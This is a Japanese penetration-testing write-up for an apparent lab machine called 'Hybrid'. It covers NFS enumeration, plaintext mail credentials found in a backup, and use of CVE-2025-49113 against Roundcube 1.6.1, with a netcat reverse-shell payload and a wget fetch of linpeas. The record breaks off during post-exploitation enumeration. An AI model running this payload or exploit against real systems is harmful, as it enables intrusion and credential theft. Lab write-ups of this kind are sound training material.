![](https://i.imgur.com/Ivzy4ge.png)

![](https://i.imgur.com/dNt27eh.png)

- URL : 
- #easy 
- OS : #Linux 
- Machine Author(s): xct
- Hacked Date: 2025/10/16

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap

| **ポート**   | **サービス**   | **バージョン**                                                    | **その他**                                                                                                     |
| --------- | ---------- | ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| 22/tcp    | **ssh**    | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ホスト鍵: ECDSA/ED25519 公開; TTL 63                                                                              |
| 25/tcp    | **smtp**   | Postfix smtpd                                                | 機能: PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN/LOGIN, 8BITMIME, DSN, CHUNKING              |
| 80/tcp    | **http**   | nginx 1.18.0 (Ubuntu)                                        | http-title: “Redirecting…”; Server: nginx/1.18.0; Methods: GET, HEAD                                        |
| 110/tcp   | **pop3**   | Dovecot pop3d                                                | CAPA: PIPELINING, STLS, SASL, TOP, UIDL, RESP-CODES; 証明書CN: mail01 / SAN: mail01; 有効: 2023-06-17〜2033-06-14 |
| 111/tcp   | rpcbind    | rpcbind v2–4 (RPC #100000)                                   | rpcinfo: nfs(2049/tcp), nfs_acl(2049), mountd(56375/59123/48301), nlockmgr(46617), status(48695) など         |
| 143/tcp   | **imap**   | Dovecot imapd (Ubuntu)                                       | CAPA: STARTTLS, IMAP4rev1, IDLE, ENABLE, SASL-IR 他; 証明書CN: mail01（110/993/995と同一系）                          |
| 587/tcp   | smtp       | Postfix smtpd (submission)                                   | 機能: PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN/LOGIN, 8BITMIME, DSN, CHUNKING              |
| 993/tcp   | ssl/imap   | Dovecot imapd (Ubuntu)                                       | CAPA: IMAP4rev1, IDLE, ENABLE, SASL-IR, AUTH=PLAIN/LOGIN; 証明書CN: mail01; 有効: 2023-06-17〜2033-06-14          |
| 995/tcp   | ssl/pop3   | Dovecot pop3d                                                | CAPA: PIPELINING, SASL(PLAIN/LOGIN), USER, TOP, UIDL; 証明書CN: mail01; 有効: 2023-06-17〜2033-06-14              |
| 2049/tcp  | nfs_acl    | nfs_acl v3 (RPC #100227)                                     | NFS 関連（rpcinfoに一致）                                                                                          |
| 46617/tcp | nlockmgr   | nlockmgr v1–4 (RPC #100021)                                  | NFS ロック管理                                                                                                   |
| 48301/tcp | mountd     | mountd v1–3 (RPC #100005)                                    | NFS マウントデーモン                                                                                                |
| 48695/tcp | status     | status v1 (RPC #100024)                                      | rpc.statd                                                                                                   |
| 56375/tcp | **mountd** | mountd v1–3 (RPC #100005)                                    | NFS マウントデーモン                                                                                                |
| 59123/tcp | **mountd** | mountd v1–3 (RPC #100005)                                    | NFS マウントデーモン                                                                                                |


```bash
sudo nmap -p0-65535 -T4 -Pn -v --open 10.10.233.118 -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv 10.10.233.118
```

```sh
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLl+dlYZiceVG9g/8U0XSs4cWJ/6msyXPI/mORr9T9i4oQA66eYZSYwrxEwYwDZvrhXu7foZtEdeu3u6uSUnl4k=
|   256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILJyLrRGDcNfa9bQg1dhsV/CPQapLeRxpWJDUOQ+MI1c
25/tcp    open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp    open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Redirecting...
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
| SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_pop3-capabilities: PIPELINING STLS SASL TOP CAPA UIDL RESP-CODES AUTH-RESP-CODE
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33639/udp   mountd
|   100005  1,2,3      39943/tcp6  mountd
|   100005  1,2,3      53555/udp6  mountd
|   100005  1,2,3      56375/tcp   mountd
|   100021  1,3,4      35853/tcp6  nlockmgr
|   100021  1,3,4      40203/udp   nlockmgr
|   100021  1,3,4      46617/tcp   nlockmgr
|   100021  1,3,4      54587/udp6  nlockmgr
|   100024  1          39841/tcp6  status
|   100024  1          48665/udp6  status
|   100024  1          48695/tcp   status
|   100024  1          51627/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: STARTTLS ID Pre-login SASL-IR OK more have IDLE listed IMAP4rev1 LOGIN-REFERRALS ENABLE capabilities LOGINDISABLEDA0001 LITERAL+ post-login
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
| SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
587/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: more ID Pre-login SASL-IR AUTH=PLAIN have IDLE listed capabilities IMAP4rev1 LOGIN-REFERRALS ENABLE OK AUTH=LOGINA0001 LITERAL+ post-login
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
| SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
| SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL(PLAIN LOGIN) USER TOP CAPA UIDL RESP-CODES AUTH-RESP-CODE
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
46617/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
48301/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
48695/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
56375/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
59123/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)

```
httpとNFSがある
あと、何かメール関連のプロトコルがある
NFSは、匿名でマウントできるのか
ドメイン : mail01.hybrid.vl
- /etc/hostsに登録

## Webサイト
- http://mail01.hybrid.vl/
![](https://i.imgur.com/N3DFTY8.png)
Roundcube Webmailのログイン画面が出てくる

## NFS
どれが空いているのか
```bash
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ showmount -e $Target_IP
Export list for 10.10.233.118:
/opt/share *
```
/opt/shareがフォルダがあることがわかる

マウントする
```sh
mkdir target-NFS
sudo mount -t nfs $Target_IP:/ ./target-NFS/ -o nolock
```

マウントできたので中を見る
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/target-NFS]
└─$ ls -la       
total 12
drwxr-xr-x 19 root root 4096 Jun 17  2023 .
drwxrwxr-x  4 kali kali 4096 Oct  9 07:30 ..
drwxr-xr-x  4 root root 4096 Jun 17  2023 opt
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/target-NFS]
└─$ cd opt       
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/target-NFS/opt]
└─$ ls -la
total 12
drwxr-xr-x  4 root   root    4096 Jun 17  2023 .
drwxr-xr-x 19 root   root    4096 Jun 17  2023 ..
drwxrwxrwx  2 nobody nogroup 4096 Jun 18  2023 share
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/target-NFS/opt]
└─$ cd share
ls
┌──(kali㉿kali)-[~/…/Hybrid/target-NFS/opt/share]
└─$ ls
backup.tar.gz
```
backup.tar.gzがあることがわかる
中を見る
この中に、Roundcube Webmailの認証情報とかあるのかな？

解凍する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ tar -xvzf backup.tar.gz
etc/passwd
etc/sssd/sssd.conf
etc/dovecot/dovecot-users
etc/postfix/main.cf
opt/certs/hybrid.vl/fullchain.pem
opt/certs/hybrid.vl/privkey.pem
```
いくつかファイルがあることがわかる

etc/passwdの中身
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/etc]
└─$ cat passwd                 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:115:121::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:116:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:117:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
vmail:x:5000:5000:virtual mail user:/var/mail/vhosts:/bin/sh
ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
_rpc:x:119:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
sssd:x:121:126:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
```
vmailとrootだけ、/bin/bashがある

etc/dovecotの中身
```sh
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/etc/dovecot]
└─$ cat dovecot-users
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!

```
ユーザー名と平文パスワードらしきものがある
Roundcube Webmailの認証情報なのでは？
もしかしたら、どっちかはDCへの認証情報なのでは？

### admin@hybrid.vlの認証情報
admin@hybrid.vl : Duckling21

### peter.turner@hybrid.vlの認証情報
peter.turner@hybrid.vl : PeterIstToll!

peter.turner
etc/sssd.conf の中身
```bash
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/etc/sssd]
└─$ cat sssd.conf    

[sssd]
domains = hybrid.vl
config_file_version = 2
services = nss, pam

[domain/hybrid.vl]
default_shell = /bin/bash
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = HYBRID.VL
realmd_tags = manages-system joined-with-adcli 
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = hybrid.vl
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad



```

etc/postfix/main.cfの中身
```sh
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/etc/postfix]
└─$ cat main.cf  
smtpd_banner = $myhostname ESMTP $mail_name
biff = no
append_dot_mydomain = no
readme_directory = no



# TLS parameters
smtp_use_tls = yes
smtp_tls_security_level = may
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache


smtpd_use_tls = yes
smtpd_tls_security_level = may
smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache
smtpd_tls_cert_file = /opt/certs/hybrid.vl/fullchain.pem
smtpd_tls_key_file = /opt/certs/hybrid.vl/privkey.pem
smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated,  reject_unauth_destination

smtpd_sasl_auth_enable = yes
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth

virtual_transport = lmtp:unix:private/dovecot-lmtp
virtual_mailbox_domains = /etc/postfix/virtual_mailbox_domains

myhostname = mail01.hybrid.vl
myorigin = /etc/mailname
mydestination =  localhost.$mydomain, localhost
relayhost = 

mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all

alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases

```

opt/certs/hybrid.vlの中身
```sh
┌──(kali㉿kali)-[~/…/Hybrid/opt/certs/hybrid.vl]
└─$ ls -la
total 16
drwxrwxr-x 2 kali kali 4096 Oct  9 07:35 .
drwxrwxr-x 3 kali kali 4096 Oct  9 07:35 ..
-rwxrwxr-x 1 kali kali 1944 Jun 17  2023 fullchain.pem
-rwxrwxr-x 1 kali kali 3414 Jun 17  2023 privkey.pem
```
fullchain.pemは、SSL証明書と中間証明書を組み合わせたものっぽい
privkey.pemは、証明書秘密鍵らしい
となると、さっき見つけた認証情報でRoundcube Webmailにログインできるのか試す

### Roundcube Webmailへのログイン試行

 「admin@hybrid.vl : Duckling21」でログインできる
![](https://i.imgur.com/wzXZ2hW.png)

なんか、Peterにメールを送ってる
![](https://i.imgur.com/iyJN3a9.png)
roundcubes junk filter pluginが有効になっているらしい
 roundcubes junk filter pluginに脆弱性とかあるのか？だとしてもバージョンがわからないとなあ
それか、細部まで見ろってこと？

なんか、とりあえずadminではなくて、peterでログインする
![](https://i.imgur.com/d7s8fL9.png)
 同じメール以外、特に見当たらない

ぽちぽちしてて、左下のAboutをクリックしたら、インストールしてるプラグインの一覧とバージョンを取得できた
![](https://i.imgur.com/IDcorR4.png)
多分メールで言ってたのは、markasjunkでver2.0であることがわかる
RoundCubeのバージョンは、1.6.1であることがわかる

markasjunk vulnで検索すると
![](https://i.imgur.com/X1uNt28.png)
いくつか見つかる
- https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/
# Foothold

## CVE-2025-49113
この記事によると、markasjunk プラグインが有効になっている場合の Roundcube バージョン 1.6.1 以前のバージョンに、RCEの脆弱性、**CVE-2025-49113**がある
該当しているかを見てみると、Roundcube バージョン 1.6.1であるので、この脆弱性があることがわかる!!!!!!!!!!

### PoC
引用 : https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/
![[Pasted image 20251009172121.png]]
メールアドレスを変更することでRCEできるらしい
リバースシェルを設定したい
メールアドレスの& &の間のコマンドを実行してくれるぽい

他のPoCも見つけたので、これでリバースシェルを立てる
```sh
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/10.10.233.118/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail01.hybrid.vl/ admin@hybrid.vl  Duckling21 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.7.156 4444 >/tmp/f"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10601
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...

```
ちなみに、全然リバースシェルがたたなかったので嬉しい

ncで待ち受けていた側
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.7.156] from (UNKNOWN) [10.10.233.118] 35588
bash: cannot set terminal process group (641): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail01:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@mail01:/$ 
```
www-dataでログインできた
# Lateral Movement

env
```bash
www-data@mail01:/$ env
env
PWD=/
SHLVL=2
LC_CTYPE=C.UTF-8
_=/usr/bin/env
```

os
```sh
www-data@mail01:/$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

```
## linpeas.sh
```sh
wget http://10.8.7.156:8888/linpeas.sh
```

```bash
╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1891/usr/bin/chage                                                                                                                                                                   
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1891/usr/bin/expiry
-rwxr-sr-x 1 root systemd-timesync 343K Mar 30  2022 /snap/core20/1891/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1891/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1891/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1891/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1822/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1822/usr/bin/expiry
-rwxr-sr-x 1 root systemd-timesync 343K Mar 30  2022 /snap/core20/1822/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1822/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Jan 24  2023 /snap/core20/1822/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 24  2023 /snap/core20/1822/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 27K Feb  2  2023 /usr/sbin/unix_chkpwd
-r-xr-sr-x 1 root postdrop 23K Apr 10  2023 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 23K Apr 10  2023 /usr/sbin/postqueue
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Nov 24  2022 /usr/bin/chage
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
-rwxr-sr-x 1 root _ssh 287K Nov 23  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 15K Dec  1  2021 /usr/bin/mlock
-rwxr-sr-x 1 root shadow 23K Nov 24  2022 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter

```
/usr/bin/write.ulが気になる
でも他のwriteup見ても、そんなに重要な役割を果たしてなさそう

homeの中を見ると
```sh
www-data@mail01:/var/www/roundcube$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root                   root                   4096 Jun 17  2023 .
drwxr-xr-x 19 root                   root                   4096 Jun 17  2023 ..
drwx------  4 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Jun 18  2023 peter.turner@hybrid.vl
```
`peter.turner@hybrid.vl`は、ユーザーのことだけど、/etc/passwdの中には、`peter.turner@hybrid.vl`というユーザーは含まれていないので、DCからのアクセスなのかなと思ったりする

/tmpフォルダの中を見てみても
```sh
www-data@mail01:/var/www/roundcube$ ls -la /tmp
ls -la /tmp
total 60
drwxrwxrwt 14 root                   root                   4096 Oct 14 05:46 .
drwxr-xr-x 19 root                   root                   4096 Jun 17  2023 ..
drwxrwxrwt  2 root                   root                   4096 Oct 14 03:58 .ICE-unix
drwxrwxrwt  2 root                   root                   4096 Oct 14 03:58 .Test-unix
drwxrwxrwt  2 root                   root                   4096 Oct 14 03:58 .X11-unix
drwxrwxrwt  2 root                   root                   4096 Oct 14 03:58 .XIM-unix
drwxrwxrwt  2 root                   root                   4096 Oct 14 03:58 .font-unix
prw-r--r--  1 www-data               www-data                  0 Oct 14 05:52 f
-rw-------  1 peter.turner@hybrid.vl domain users@hybrid.vl  165 Oct 14 04:51 krb5cc_902601108_ICFzTk
drwx------  3 root                   root                   4096 Oct 14 03:58 snap-private-tmp
drwx------  3 root                   root                   4096 Oct 14 03:58 systemd-private-3466aabc3c414a7d94cf3f1f0e868b0d-ModemManager.service-CkfBmd
drwx------  3 root                   root                   4096 Oct 14 03:58 systemd-private-3466aabc3c414a7d94cf3f1f0e868b0d-dovecot.service-TYrAKP
drwx------  3 root                   root                   4096 Oct 14 03:58 systemd-private-3466aabc3c414a7d94cf3f1f0e868b0d-systemd-logind.service-sHwlrK
drwx------  3 root                   root                   4096 Oct 14 03:58 systemd-private-3466aabc3c414a7d94cf3f1f0e868b0d-systemd-resolved.service-auXggb
drwx------  3 root                   root                   4096 Oct 14 03:58 systemd-private-3466aabc3c414a7d94cf3f1f0e868b0d-systemd-timesyncd.service-NP1ICt
drwx------  2 www-data               www-data               4096 Oct 14 05:37 tmux-33
www-data@mail01:/var/www/roundcube$ 
```
`peter.turner@hybrid.vl`の権限で、「krb5cc_902601108_ICFzTk」とKerberosのチケットがあることがわかる

```sh

```


## DCへの横展開の試行(失敗)
peterの認証情報でDCへの横展開ができるのかどうかを試した
SMB
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc smb 10.10.159.53 -u 'peter.turner' -p 'PeterIstToll!' --shares
SMB         10.10.159.53    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True
SMB         10.10.159.53    445    DC01             [-] hybrid.vl\peter.turner:PeterIstToll! STATUS_LOGON_FAILURE 
                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc smb 10.10.159.53 -u 'peter.turner' -p 'Duckling21' --shares
SMB         10.10.159.53    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True
SMB         10.10.159.53    445    DC01             [-] hybrid.vl\peter.turner:Duckling21 STATUS_LOGON_FAILURE 
```

LDAP
```sh
┌──(kali㉿kali)-[~/…/Vulnhub/Hybrid/10.10.233.118/CVE-2025-49113-exploit]
└─$ nxc ldap 10.10.159.53 -u 'peter.turner' -p 'PeterIstToll!'
LDAP        10.10.159.53    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.159.53    389    DC01             [-] hybrid.vl\peter.turner:PeterIstToll!
```
両方ともダメか

ASREP-Roasting
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ impacket-GetNPUsers hybrid.vl/ -dc-ip 10.10.159.53 -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User peter.turner doesn't have UF_DONT_REQUIRE_PREAUTH set

```
ない
KerberostingはそもそもpeterがLDAPへの権限を持っていないので、できない


## mysql
```sh
╔══════════╣ Analyzing Roundcube Files (limit 70)
drwxr-xr-x 13 www-data www-data 4096 Oct  9 09:20 /var/www/roundcube                                                                                                                                                                        
-rw-r--r-- 1 www-data www-data 2682 Jun 18  2023 /var/www/roundcube/config/config.inc.php
$config['db_dsnw'] = 'mysql://roundcube:Duckling21@localhost/roundcubemail';
$config['imap_host'] = 'localhost:143';
$config['support_url'] = '';
$config['des_key'] = 'RpiHQJt10wGZdlMAU9CnBPfc';
$config['plugins'] = ["markasjunk"];
-rwxr-xr-x 1 root root 8451 Jun 18  2023 /var/www/roundcube/plugins/markasjunk/config.inc.php
$config['markasjunk_learning_driver'] = "cmd_learn";
$config['markasjunk_ham_mbox'] = null;
$config['markasjunk_spam_mbox'] = null;
$config['markasjunk_read_spam'] = false;
$config['markasjunk_unread_ham'] = false;
$config['markasjunk_spam_flag'] = 'Junk';
$config['markasjunk_ham_flag'] = 'NonJunk';
$config['markasjunk_debug'] = false;
$config['markasjunk_toolbar'] = true;
$config['markasjunk_move_spam'] = false;
$config['markasjunk_move_ham'] = false;
$config['markasjunk_permanently_remove'] = false;
$config['markasjunk_spam_only'] = false;
// Example: $config['markasjunk_allowed_hosts'] = ['mail1.domain.tld', 'mail2.domain.tld'];
$config['markasjunk_allowed_hosts'] = null;
// Example: $config['markasjunk_host_config'] = [
$config['markasjunk_host_config'] = null;
$config['markasjunk_spam_cmd'] = "salearn %i";
$config['markasjunk_ham_cmd'] = null;
$config['markasjunk_spam_dir'] = null;
$config['markasjunk_ham_dir'] = null;
$config['markasjunk_filename'] = null;
$config['markasjunk_email_spam'] = null;
$config['markasjunk_email_ham'] = null;
$config['markasjunk_email_attach'] = true;
$config['markasjunk_email_subject'] = 'learn this message as %t';
$config['markasjunk_sauserprefs_config'] = '../sauserprefs/config.inc.php';
$config['markasjunk_amacube_config'] = '../amacube/config.inc.php';
$config['markasjunk_spam_patterns'] = [
$config['markasjunk_ham_patterns'] = [

drwxr-xr-x 4 www-data www-data 4096 Jun 17  2023 /var/www/roundcube/vendor/roundcube

```
mysqlの認証情報？が見つかった？
mysql://roundcube:Duckling21@localhost/roundcubemail

### mysqlの認証情報
roundcube : Duckling21

mysqlは動いているのか？
```sh
